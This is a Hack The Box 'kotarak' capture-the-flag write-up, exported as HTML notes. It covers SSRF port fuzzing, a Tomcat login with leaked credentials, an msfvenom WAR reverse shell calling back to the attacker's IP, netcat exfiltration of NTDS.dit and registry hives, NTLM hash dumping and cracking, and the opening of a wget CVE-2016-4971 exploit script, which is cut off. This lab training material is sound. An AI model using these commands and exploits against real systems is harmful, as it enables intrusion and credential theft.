<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>kotarak</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#kotarak">kotarak</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#all ports">all ports</a></li>
<li><a href="#targeted ports">targeted ports</a></li>
<ol>
<li><a href="#:8080">:8080</a></li>
<li><a href="#:8009">:8009</a></li>
<li><a href="#:60000">:60000</a></li>
</ol>
</ol>
<li><a href="#kotarak web hosting page">kotarak web hosting page</a></li>
<ol>
<li><a href="#mess with path">mess with path</a></li>
<li><a href="#burp">burp</a></li>
<li><a href="#localhost">localhost</a></li>
<li><a href="#wfuzz">wfuzz</a></li>
<ol>
<li><a href="#wfuzz all ports of victim machine's localhost">wfuzz all ports of victim machine's localhost</a></li>
<ol>
<li><a href="#:22">:22</a></li>
<li><a href="#:90">:90</a></li>
<li><a href="#:110">:110</a></li>
<li><a href="#:200">:200</a></li>
<li><a href="#:320">:320</a></li>
<li><a href="#:888">:888</a></li>
<ol>
<li><a href="#?doc=is ">?doc=is </a></li>
<li><a href="#?doc=backup SSRF">?doc=backup SSRF</a></li>
<li><a href="#?doc=blah">?doc=blah</a></li>
</ol>
<li><a href="#:60000">:60000</a></li>
</ol>
</ol>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#Tomcat login">Tomcat login</a></li>
<ol>
<li><a href="#war upload">war upload</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#find files in home directory">find files in home directory</a></li>
<li><a href="#exfil .bin file">exfil .bin file</a></li>
<li><a href="#impacket">impacket</a></li>
<ol>
<li><a href="#crack some ntlm hashes">crack some ntlm hashes</a></li>
<ol>
<li><a href="#hashcat">hashcat</a></li>
<li><a href="#crackstation (online)">crackstation (online)</a></li>
</ol>
</ol>
<li><a href="#privesc to atanis">privesc to atanis</a></li>
<ol>
<li><a href="#user.txt">user.txt</a></li>
<li><a href="#app.log">app.log</a></li>
</ol>
<li><a href="#arp -a ">arp -a </a></li>
</ol>
<li><a href="#priv esc">priv esc</a></li>
<ol>
<li><a href="#out of date wget">out of date wget</a></li>
<ol>
<li><a href="#set up nc listener on port 80">set up nc listener on port 80</a></li>
<li><a href="#exploit">exploit</a></li>
<ol>
<li><a href="#part 1: prepare malicious .wgetrc file on attack machine">part 1: prepare malicious .wgetrc file on attack machine</a></li>
<li><a href="#part 2: set up ftp server on port 21  (w/ authbind)">part 2: set up ftp server on port 21  (w/ authbind)</a></li>
<li><a href="#part 3: exploit.py">part 3: exploit.py</a></li>
</ol>
<li><a href="#root">root</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>kotarak</u></b></h1><img alt="images/851-1.png" src="images/851-1.png"/><br/><img alt="images/851-2.png" src="images/851-2.png"/></div>
</body></html><div class="page" id="kotarak"><h1><b><u>kotarak</u></b></h1><img alt="images/851-1.png" src="images/851-1.png"/><br/><img alt="images/851-2.png" src="images/851-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/852-1.png" src="images/852-1.png"/><br/><span style="color:#24ff00;">Initial scan shows <br/></span><span style="color:#ffa500;">port 22</span><span style="color:#24ff00;"> running </span><span style="color:#ffa500;">ssh</span><br/><span style="color:#ffa500;">port 8009 </span><span style="color:#24ff00;">running </span><span style="color:#ffa500;">Apache Jserv</span><br/><span style="color:#ffa500;">port 8080 </span><span style="color:#24ff00;">running </span><span style="color:#ffa500;">http</span></div>
<div class="page" id="all ports"><h1><b><u>all ports</u></b></h1><span style="color:#24ff00;">Check to see if any services are running on obscure ports<br/><br/></span><img alt="images/853-1.png" src="images/853-1.png"/><br/>we find theres a pecular unknown service running on port <span style="color:#ffa500;">60000</span></div>
<div class="page" id="targeted ports"><h1><b><u>targeted ports</u></b></h1><span style="color:#24ff00;">Seems port </span><span style="color:#ffa500;">60000</span><span style="color:#24ff00;"> is running http on it, lets navigate to it</span><br/><br/><img alt="images/858-1.png" src="images/858-1.png"/><br/><br/></div>
<div class="page" id=":8080"><h1><b><u>:8080</u></b></h1><img alt="images/860-1.png" src="images/860-1.png"/></div>
<div class="page" id=":8009"><h1><b><u>:8009</u></b></h1><img alt="images/862-1.png" src="images/862-1.png"/></div>
<div class="page" id=":60000"><h1><b><u>:60000</u></b></h1><img alt="images/861-1.png" src="images/861-1.png"/></div>
<div class="page" id="kotarak web hosting page"><h1><b><u>kotarak web hosting page</u></b></h1><img alt="images/859-1.png" src="images/859-1.png"/><br/><br/><br/><img alt="images/859-2.png" src="images/859-2.png"/><span style="color:#24ff00;"> this is the url we get after using the browser bar</span><br/><br/><br/></div>
<div class="page" id="mess with path"><h1><b><u>mess with path</u></b></h1><span style="color:#24ff00;">lets use server side request forgeries (</span><span style="color:#ffa500;">SSRF</span><span style="color:#24ff00;">) see if we can expose some sensitive files or services on the victim machine<br/><br/></span><img alt="images/863-1.png" src="images/863-1.png"/><br/><br/>results in the server replying <br/><img alt="images/863-2.png" src="images/863-2.png"/><br/><br/>lets send it to burp<br/></div>
<div class="page" id="burp"><h1><b><u>burp</u></b></h1><span style="color:#24ff00;">aif we simply send “file” through burp <br/></span><img alt="images/864-1.png" src="images/864-1.png"/>v<img alt="images/864-2.png" src="images/864-2.png"/><br/><br/>we still get <img alt="images/864-3.png" src="images/864-3.png"/> but lets check what happens when the command should error out: we'll use “fil”<br/><br/><img alt="images/864-4.png" src="images/864-4.png"/><img alt="images/864-5.png" src="images/864-5.png"/><br/><br/>nothing happens which means theres some sort of regular expression searching with file</div>
<div class="page" id="localhost"><h1><b><u>localhost</u></b></h1><span style="color:#24ff00;">if we point the search at the localhost on the same port we see a </span><span style="color:#ffa500;">200</span><span style="color:#24ff00;"> ok response come back from the server<br/><br/></span><img alt="images/865-1.png" src="images/865-1.png"/><img alt="images/865-2.png" src="images/865-2.png"/><br/>meaning the box is susceptable to <span style="color:#ffff00;">server side request forgeries</span><span style="color:#24ff00;"> or </span><span style="color:#ffff00;">SSRFs</span><span style="color:#24ff00;">!<br/><br/>lets do a port sweep of localhost's ports with the help of the popular fuzz tool </span><span style="color:#ffa500;">wfuzz</span><span style="color:#24ff00;">:<br/></span></div>
<div class="page" id="wfuzz"><h1><b><u>wfuzz</u></b></h1><span style="color:#24ff00;">here are wfuzz's usage and </span><span style="color:#ffa500;">arguments</span><span style="color:#24ff00;">:</span><br/><br/><img alt="images/854-1.png" src="images/854-1.png"/><br/><img alt="images/854-2.png" src="images/854-2.png"/></div>
<div class="page" id="wfuzz all ports of victim machine's localhost"><h1><b><u>wfuzz all ports of victim machine's localhost</u></b></h1><h2>lets run wfuzz against all the victim machines localhost ports and see which we can connect to </h2><br/><img alt="images/857-1.png" src="images/857-1.png"/><br/><h2>and our fuzz target which is </h2><a href="http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ">http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</a><h2> <br/>wfuzz -c -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</h2><br/><h2>where FUZZ is the placeholder where the payload of range 1- 65535 will be inserted </h2><br/><h2>-c is for colors</h2><br/><h2>-z for payload of range,1-65535 (targeting all ports)</h2><h1><br/><br/><br/></h1><img alt="images/857-2.png" src="images/857-2.png"/><br/><br/><br/><h2>we're getting status code 200 responses for everything with </h2><strong><h2>2</h2></strong><h2> characters, but checking the port on burp reveals that its nothing</h2><br/><img alt="images/857-3.png" src="images/857-3.png"/><img alt="images/857-4.png" src="images/857-4.png"/><br/><br/><br/><h2>lets hide every output that has 2 character output by tweaking the script with --hl=2 to hide any 2 Ch responses</h2><br/><img alt="images/857-5.png" src="images/857-5.png"/><br/><img alt="images/857-6.png" src="images/857-6.png"/><br/><span style="color:#24ff00;">Boom, we have a few interesting ports </span><span style="color:#ffa500;">22</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;">90</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;">110</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;">200</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;">320</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;">888 and 57831</span><span style="color:#24ff00;"> to look into, lets visit each port</span><br/></div>
<div class="page" id=":22"><h1><b><u>:22</u></b></h1><h1>Nothing here </h1><br/><br/><br/><img alt="images/867-1.png" src="images/867-1.png"/><img alt="images/867-2.png" src="images/867-2.png"/><br/><br/><img alt="images/867-3.png" src="images/867-3.png"/></div>
<div class="page" id=":90"><h1><b><u>:90</u></b></h1><h2>This page is under constuction, lets move on</h2><br/><br/><img alt="images/868-1.png" src="images/868-1.png"/><img alt="images/868-2.png" src="images/868-2.png"/><br/><br/><img alt="images/868-3.png" src="images/868-3.png"/></div>
<div class="page" id=":110"><h1><b><u>:110</u></b></h1><h2>Nothing to see here, just smile and wave</h2><br/><br/><img alt="images/869-1.png" src="images/869-1.png"/><img alt="images/869-2.png" src="images/869-2.png"/><br/><img alt="images/869-3.png" src="images/869-3.png"/><br/></div>
<div class="page" id=":200"><h1><b><u>:200</u></b></h1><h2>Rndom Hello world page, dead end</h2><br/><br/><img alt="images/870-1.png" src="images/870-1.png"/><img alt="images/870-2.png" src="images/870-2.png"/><br/><br/><img alt="images/870-3.png" src="images/870-3.png"/></div>
<div class="page" id=":320"><h1><b><u>:320</u></b></h1><h2>Login page! lets make note of this and maybe look for some credentials</h2><br/><br/><br/><img alt="images/871-1.png" src="images/871-1.png"/><img alt="images/871-2.png" src="images/871-2.png"/><br/><br/><br/><img alt="images/871-3.png" src="images/871-3.png"/></div>
<div class="page" id=":888"><h1><b><u>:888</u></b></h1><h2>Files! lets look at each of these files</h2><br/><br/><img alt="images/872-1.png" src="images/872-1.png"/><img alt="images/872-2.png" src="images/872-2.png"/><br/><br/><img alt="images/872-3.png" src="images/872-3.png"/></div>
<div class="page" id="?doc=is "><h1><b><u>?doc=is </u></b></h1><img alt="images/866-1.png" src="images/866-1.png"/><h2> is empty</h2><br/><br/><img alt="images/866-2.png" src="images/866-2.png"/></div>
<div class="page" id="?doc=backup SSRF"><h1><b><u>?doc=backup SSRF</u></b></h1><h2>Tomcat credentials!<br/>looking at the server response we see there are tomcat credentials leaked </h2><img alt="images/875-1.png" src="images/875-1.png"/><br/><br/><span style="color:#ffff00;">admin<br/>3@g01PdhB!</span><br/><br/><br/><img alt="images/875-2.png" src="images/875-2.png"/></div>
<div class="page" id="?doc=blah"><h1><b><u>?doc=blah</u></b></h1><img alt="images/874-1.png" src="images/874-1.png"/><h2> blahhhhhh, nothing here</h2><br/><br/><img alt="images/874-2.png" src="images/874-2.png"/><img alt="images/874-3.png" src="images/874-3.png"/><br/><br/>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div>
<div class="page" id=":60000"><h1><b><u>:60000</u></b></h1><h2>we see the same http service running on localhost port 60000</h2><br/><br/><br/><img alt="images/873-1.png" src="images/873-1.png"/><br/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">Tomcat is running on port </span><span style="color:#ffa500;">8080</span><span style="color:#24ff00;"> as per our nmap scan, so lets navigate there under the </span><span style="color:#ffa500;">/manager/html </span><span style="color:#24ff00;">url because that is typically the login page of tomcat servers</span><br/></div>
<div class="page" id="Tomcat login"><h1><b><u>Tomcat login</u></b></h1><span style="color:#24ff00;">Bingo! and because we found leaked credentials thanks to the Server Side Request Forgery vulnerability, lets use them to login to admin</span><br/><br/><span style="color:#ffff00;">admin<br/>3@g01PdhB!</span><br/><img alt="images/876-1.png" src="images/876-1.png"/><br/><br/><span style="color:#24ff00;">and we're in!</span><br/><img alt="images/876-2.png" src="images/876-2.png"/></div>
<div class="page" id="war upload"><h1><b><u>war upload</u></b></h1><span style="color:#24ff00;">One crucial thing to remember about </span><span style="color:#ffff00;">t0mcat webservers</span><span style="color:#24ff00;"> is that they typically execute </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">files and luckily, </span><span style="color:#ffa500;">msfvenom</span><span style="color:#24ff00;"> is capable of generating a </span><span style="color:#ffa500;">reverse shell</span><span style="color:#24ff00;"> written in </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">easily for us, for reference check out </span><a href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/">this link</a><br/><img alt="images/855-1.png" src="images/855-1.png"/><br/><br/><span style="color:#24ff00;">another way to find the correct payload is to grep for </span><span style="color:#ffa500;">msfvenom's </span><span style="color:#ffff00;">reverse shell payloads</span><span style="color:#24ff00;"> </span><br/><span style="color:#ffa500;">msfvenom -l payloads | grep reverse</span><br/><span style="color:#24ff00;">where</span><span style="color:#ffa500;"> -l </span><span style="color:#24ff00;"> is list</span><br/><img alt="images/855-2.png" src="images/855-2.png"/><br/><img alt="images/855-3.png" src="images/855-3.png"/><br/><br/><br/><img alt="images/855-4.png" src="images/855-4.png"/><br/><span style="color:#ffa500;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.62 LPORT=80 -f war &gt; shell.war</span><br/><span style="color:#24ff00;">where</span><br/><span style="color:#ffa500;">LHOST</span><span style="color:#24ff00;"> to our attacking machine's </span><span style="color:#ffa500;">local host</span><span style="color:#24ff00;"> IP<br/></span><span style="color:#ffa500;">LPORT</span><span style="color:#24ff00;"> to the </span><span style="color:#ffa500;">local port</span><span style="color:#24ff00;"> we want to have netcat listen on, we choose port </span><span style="color:#ffa500;">80</span><span style="color:#24ff00;"> here because it's most likely to make it through a firewall (</span><span style="color:#ffa500;">53</span><span style="color:#24ff00;"> is also a good choice)<br/></span><span style="color:#ffa500;">-p </span><span style="color:#24ff00;">is for payload </span><span style="color:#ffa500;">java/jsp_shell_reverse_tcp</span><span style="color:#24ff00;"> to send the reverse shell back<br/></span><span style="color:#ffa500;">-f </span><span style="color:#24ff00;">is for filetype </span><span style="color:#ffa500;">.war </span><span style="color:#24ff00;">because Tomcat servers run war files</span><br/><img alt="images/855-5.png" src="images/855-5.png"/><br/><br/><img alt="images/855-6.png" src="images/855-6.png"/><br/><img alt="images/855-7.png" src="images/855-7.png"/><br/><br/><br/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">now that the file is uploaded we can execute it simply by navigating to the URL in which it is saved</span><br/><br/><br/><img alt="images/877-1.png" src="images/877-1.png"/><br/><br/><img alt="images/877-2.png" src="images/877-2.png"/><br/><br/><span style="color:#24ff00;">perfect!</span><br/><img alt="images/877-3.png" src="images/877-3.png"/><br/><br/><span style="color:#24ff00;">now lets spawn and shell and implement tab auto complete</span><br/><span style="color:#ffa500;">python -c 'import pty;pty.spawn("/bin/bash")'</span><br/><img alt="images/877-4.png" src="images/877-4.png"/><br/><br/><span style="color:#ffa500;">ctrl+z </span><span style="color:#24ff00;">to background <br/>then </span><span style="color:#ffa500;">stty raw -echo </span><br/><span style="color:#ffa500;">fg</span><span style="color:#24ff00;"> to foregound</span><br/><img alt="images/877-5.png" src="images/877-5.png"/></div>
<div class="page" id="find files in home directory"><h1><b><u>find files in home directory</u></b></h1><span style="color:#24ff00;">lets navigate to our </span><span style="color:#ffa500;">home</span><span style="color:#24ff00;"> directory</span><br/><br/><img alt="images/881-1.png" src="images/881-1.png"/><br/><br/><span style="color:#24ff00;">if we navigate to tomcat/to_archive_pentest_data we see we have two files<br/></span><img alt="images/881-2.png" src="images/881-2.png"/><br/><br/>we see PSEXEC and NTDS<br/>this is stored on windows active directory controllers.. it is the HEART of windows active directory<br/>information, group policies etc/ including PASSWORDS<br/><br/>.dit is just data (no magic byte)<br/>.bin is a MS registry file " im going to to assume this is the system hive file which contains the boot key that allows us the crypt the .dit<br/><br/>lets exfil these files to our attacking machine<br/><br/><br/></div>
<div class="page" id="exfil .bin file"><h1><b><u>exfil .bin file</u></b></h1><span style="color:#24ff00;">lets set up a listener and have it save to a local file </span><br/>WARNING: <span style="color:#24ff00;">make sure you have the symbols right because if you reverse them you'll overwrite the</span><span style="color:#ffa500;"> bin</span><span style="color:#24ff00;"> file you're trying to exfiltrate and will need to revert the box!</span><br/><br/><br/><span style="color:#ffa500;">nc -nlvp 443 &gt; SYSTEM</span><br/><img alt="images/882-1.png" src="images/882-1.png"/><br/><br/><span style="color:#ffa500;">nc 10.10.14.62 443 &gt; 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin </span><br/><img alt="images/882-2.png" src="images/882-2.png"/><br/><img alt="images/882-3.png" src="images/882-3.png"/><br/><br/><img alt="images/882-4.png" src="images/882-4.png"/><br/><br/><img alt="images/882-5.png" src="images/882-5.png"/><br/><span style="color:#24ff00;">-------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br/><br/><span style="color:#24ff00;">we can also set up a </span><span style="color:#ffff00;">python http server </span><span style="color:#24ff00;">on our victim and </span><span style="color:#ffa500;">wget</span><span style="color:#24ff00;"> them to our attack machine<br/>this way is safer and will prevent you from overwriting the </span><span style="color:#ffa500;">bin</span><span style="color:#24ff00;"> files like a moron (like i did twice)</span><br/><br/><span style="color:#ffa500;">python -m SimpleHTTPServer 5555<br/>wget http://10.10.10.55:5555/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit<br/>wget http://10.10.10.55:5555/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin</span></div>
<div class="page" id="impacket"><h1><b><u>impacket</u></b></h1><span style="color:#24ff00;">Use Impacket’s secretdump script to extract passwords.</span><br/><span style="color:#ffa500;">impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</span><br/><img alt="images/883-1.png" src="images/883-1.png"/><br/><span style="color:#ffff00;">hashes:</span><br/><img alt="images/883-2.png" src="images/883-2.png"/><br/><span style="color:#ffff00;">Kerberos Keys</span><br/><img alt="images/883-3.png" src="images/883-3.png"/><br/><img alt="images/883-4.png" src="images/883-4.png"/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="crack some ntlm hashes"><h1><b><u>crack some ntlm hashes</u></b></h1><span style="color:#24ff00;">gonna crack these </span><span style="color:#ffff00;">hashes</span><span style="color:#24ff00;"> with the crackstation online tool but we could also crack them locally with tools like </span><span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">OPHcrack</span> <br/><br/><span style="color:#ffff00;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::<br/>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::<br/>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::<br/>WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::<br/>WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::<br/>WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::<br/>WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::<br/>atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br/><br/><span style="color:#24ff00;">the accounts ending in $ are machine accounts and have automatically generated and</span><span style="color:#ff0000;"> incredibly strong passwords</span><span style="color:#24ff00;">, we're after </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">guest</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">kerberos' ticket generating ticket</span><span style="color:#24ff00;"> (golden ticket) and </span><span style="color:#ffff00;">atanas</span><br/><br/><img alt="images/885-1.png" src="images/885-1.png"/><br/><img alt="images/885-2.png" src="images/885-2.png"/><br/><img alt="images/885-3.png" src="images/885-3.png"/><br/><br/><br/></div>
<div class="page" id="hashcat"><h1><b><u>hashcat</u></b></h1><img alt="images/886-1.png" src="images/886-1.png"/><br/><br/><span style="color:#24ff00;">hashes are </span><span style="color:#ffa500;">NTLM</span><span style="color:#24ff00;"> so we use module</span> <span style="color:#ffa500;">1000</span><br/><br/><span style="color:#ffa500;">hashcat -m 1000 ntlm_hashes /usr/share/wordlists/rockyou.txt </span><br/></div>
<div class="page" id="crackstation (online)"><h1><b><u>crackstation (online)</u></b></h1><img alt="images/889-1.png" src="images/889-1.png"/><br/><br/><span style="color:#24ff00;">e64fe0f24ba2489c05e64354d74ebd11 = </span><span style="color:#ffff00;">f16tomcat!</span><span style="color:#24ff00;"><br/>2b576acbe6bcfda7294d6bd18041b8fe = </span><span style="color:#ffff00;">Password123!<br/></span></div>
<div class="page" id="privesc to atanis"><h1><b><u>privesc to atanis</u></b></h1><span style="color:#24ff00;">lets try both passwords to escalate to atanas, </span><span style="color:#ffff00;">Password123!</span><span style="color:#24ff00;"> doesnt work but when we try </span><span style="color:#ffff00;">f16tomcat!</span><span style="color:#24ff00;"> ....<br/></span><img alt="images/891-1.png" src="images/891-1.png"/><br/><br/>we escalated to <span style="color:#ffff00;">atanas</span><span style="color:#24ff00;">! lets grab the user flag and move on!</span><br/><br/><br/>note: <span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> to atanas does NOT work</span><br/><span style="color:#24ff00;">even though we know f16tomcat! works when using the su command, ssh will not allow us to connect,<br/><br/>the atanas user cannot ssh </span> <br/><br/><img alt="images/891-2.png" src="images/891-2.png"/><br/><br/></div>
<div class="page" id="user.txt"><h1><b><u>user.txt</u></b></h1><img alt="images/893-1.png" src="images/893-1.png"/><span style="color:#24ff00;"><br/><br/>if we go to </span><span style="color:#ffa500;">/root</span><span style="color:#24ff00;">:<br/></span><img alt="images/893-2.png" src="images/893-2.png"/><br/>seems the flag we are looking for does not exist on this box, in that case it looks like we'll need to pivot to another box for the root flag<br/><br/></div>
<div class="page" id="app.log"><h1><b><u>app.log</u></b></h1><span style="color:#24ff00;">if we look into </span><span style="color:#ffa500;">/root's </span><span style="color:#24ff00;">files we notice </span><span style="color:#ffff00;">atanas</span><span style="color:#24ff00;"> has ownership over a second file </span><span style="color:#ffa500;">app.log</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/894-1.png" src="images/894-1.png"/><br/><br/><br/>looking into the log file we see <span style="color:#ffff00;">3 wget requests</span><span style="color:#24ff00;"> coming from</span><span style="color:#ffff00;"> 10.0.3.133</span><span style="color:#24ff00;">, the box we need to pivot to<br/>Also, it can be noted that wget version 1.16 is an old version of wget and we should look into potential vulnerabilities in the outdated software<br/></span><img alt="images/894-2.png" src="images/894-2.png"/><br/><br/></div>
<div class="page" id="arp -a "><h1><b><u>arp -a </u></b></h1><span style="color:#24ff00;">the </span><span style="color:#ffa500;">arp -a </span><span style="color:#24ff00;">command outputs the machine's address resolution protocal and lets you see what types of machines are talking to that particular host<br/><br/></span><img alt="images/884-1.png" src="images/884-1.png"/><br/>we have another box on ip <span style="color:#ffff00;">10.0.3.133 </span><span style="color:#24ff00;">talking to kotorak's DMZ<br/><br/></span></div>
<div class="page" id="priv esc"><h1><b><u>priv esc</u></b></h1><span style="color:#24ff00;">this is where things get tricky<br/>we see that the IP address </span><span style="color:#ffff00;">10.0.3.133</span><span style="color:#24ff00;"> is making a </span><span style="color:#ffa500;">GET</span><span style="color:#24ff00;"> request to port 80 (default port) to our target machine every </span><span style="color:#ffff00;">2 minutes</span><span style="color:#24ff00;"><br/><br/>Since the log of this </span><span style="color:#ffa500;">cronjob</span><span style="color:#24ff00;"> is saved in the root directory, then we can assume that the </span><span style="color:#ffa500;">cronjob</span><span style="color:#24ff00;"> might be running with </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> privileges and if that's the case we can escalate our privileges to root<br/><br/><br/><br/></span></div>
<div class="page" id="out of date wget"><h1><b><u>out of date wget</u></b></h1><img alt="images/890-1.png" src="images/890-1.png"/><br/><br/><br/><span style="color:#24ff00;">we see theres a way to exploit file uploads as well as RCE</span><br/><img alt="images/890-2.png" src="images/890-2.png"/></div>
<div class="page" id="set up nc listener on port 80"><h1><b><u>set up nc listener on port 80</u></b></h1><span style="color:#24ff00;">we can set up a listener on port 80 and confirm the cronjob runs every 2 minutes with netcat<br/></span><img alt="images/896-1.png" src="images/896-1.png"/><br/><br/>we get denied because we're not allowed to bind to ports less than 1024 without root privileges!<br/><br/>so lets check for <span style="color:#ffa500;">AUTHBIND</span><span style="color:#24ff00;"> which would bypass that permission check<br/></span><span style="color:#ffa500;">which authbind</span><span style="color:#24ff00;"><br/> </span><img alt="images/896-2.png" src="images/896-2.png"/><br/><br/><br/><img alt="images/896-3.png" src="images/896-3.png"/><br/><br/><br/><img alt="images/896-4.png" src="images/896-4.png"/></div>
<div class="page" id="exploit"><h1><b><u>exploit</u></b></h1><span style="color:#24ff00;">lets mirror the exploit to our working directory and take a closer look at what it does</span><br/><img alt="images/895-1.png" src="images/895-1.png"/><br/><br/><img alt="images/895-2.png" src="images/895-2.png"/><br/><br/><img alt="images/895-3.png" src="images/895-3.png"/><br/><br/><span style="color:#24ff00;">lastly we want to copy the python </span><span style="color:#ffff00;">exploit</span><span style="color:#24ff00;"> and run the file so that every </span><span style="color:#ffff00;">2 minutes </span><span style="color:#24ff00;">when the victim's </span><span style="color:#ffa500;">cronjob</span><span style="color:#24ff00;"> is executed, it sends a</span><span style="color:#ffa500;"> reverse shell</span><span style="color:#24ff00;"> back to our attack machine</span><br/><br/>---[ wget-exploit.py ]---<br/><br/>#!/usr/bin/env python<br/><br/>#<br/># Wget 1.18 &lt; Arbitrary File Upload Exploit<br/># Dawid Golunski<br/># dawid( at )legalhackers.com<br/>#<br/># <a href="http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt">http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</a><br/>#<br/># CVE-2016-4971 <br/>#<br/><br/>import SimpleHTTPServer<br/>import SocketServer<br/>import socket;<br/><br/>class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):<br/>   def do_GET(self):<br/>       # This takes care of sending .wgetrc<br/><br/>       print "We have a volunteer requesting " + self.path + " by GET :)\n"<br/>       if "Wget" not in self.headers.getheader('User-Agent'):<br/>	  print "But it's not a Wget :( \n"<br/>          self.send_response(200)<br/>          self.end_headers()<br/>          self.wfile.write("Nothing to see here...")<br/>          return<br/><br/>       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"<br/>       self.send_response(301)<br/>       new_path = '%s'%('<a href="ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST,">ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST,</a> FTP_PORT) )<br/>       print "Sending redirect to %s \n"%(new_path)<br/>       self.send_header('Location', new_path)<br/>       self.end_headers()<br/><br/>   def do_POST(self):<br/>       # In here we will receive extracted file and install a PoC cronjob<br/><br/>       print "We have a volunteer requesting " + self.path + " by POST :)\n"<br/>       if "Wget" not in self.headers.getheader('User-Agent'):<br/>	  print "But it's not a Wget :( \n"<br/>          self.send_response(200)<br/>          self.end_headers()<br/>          self.wfile.write("Nothing to see here...")<br/>          return<br/><br/>       content_len = int(self.headers.getheader('content-length', 0))<br/>       post_body = self.rfile.read(content_len)<br/>       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % 